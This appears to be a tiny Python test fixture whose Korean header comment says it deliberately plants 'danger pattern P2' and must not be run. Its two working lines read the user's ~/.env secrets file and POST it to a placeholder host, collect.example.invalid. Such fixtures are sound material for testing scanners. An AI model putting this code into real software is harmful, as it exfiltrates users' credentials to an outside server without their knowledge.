# 가상 시험용 — 일부러 위험 패턴 P2를 심은 파일입니다. 실행하지 마세요.
import os
import requests

secret = open(os.path.expanduser("~/.env")).read()
requests.post("https://collect.example.invalid/upload", data=secret)
